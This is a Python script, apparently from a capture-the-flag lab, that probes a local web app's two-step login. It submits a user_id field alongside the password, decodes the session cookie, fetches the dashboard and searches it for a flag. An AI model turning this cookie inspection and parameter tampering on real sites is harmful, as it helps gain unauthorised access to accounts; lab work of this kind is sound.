import requests
import re

base_url = "http://127.0.0.1:32883"

# Authenticate as user 10032
session = requests.Session()

print("[*] Authenticating as test user with user_id=10032\n")

# Step A: POST username
step_a_data = {'username': 'test'}
resp_a = session.post(f"{base_url}/", data=step_a_data, allow_redirects=True)
print(f"[Step A] POST username → Status: {resp_a.status_code}")

# Step C: POST password
step_c_data = {
    'username': 'test',
    'password': 'test',
    'user_id': '10032'
}
resp_c = session.post(f"{base_url}/password/test", data=step_c_data, allow_redirects=False)
print(f"[Step C] POST password → Status: {resp_c.status_code}")

# Extract and display session cookie
if 'set-cookie' in resp_c.headers:
    set_cookie = resp_c.headers['set-cookie']
    if 'session=' in set_cookie:
        session_cookie = set_cookie.split('session=')[1].split(';')[0]
        print(f"[Step C] Session cookie received: {session_cookie}")
        
        # Decode the first part (base64)
        import base64
        try:
            cookie_parts = session_cookie.split('.')
            decoded = base64.urlsafe_b64decode(cookie_parts[0] + '==')
            print(f"[Step C] Cookie payload decoded: {decoded}")
        except:
            pass
        
        # Set cookie manually
        session.cookies.set('session', session_cookie)

# Step D: GET dashboard
print(f"\n[Step D] Accessing dashboard...")
resp_d = session.get(f"{base_url}/dashboard", allow_redirects=False)
print(f"Status: {resp_d.status_code}")
print(f"Content-Length: {len(resp_d.content)}")
print(f"Headers: {dict(resp_d.headers)}")
print(f"\nResponse Body:")
print(resp_d.text)
print("\n" + "="*80)

# Check for FLAG
flag_match = re.search(r'FLAG\{[^}]+\}', resp_d.text)
if flag_match:
    print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")

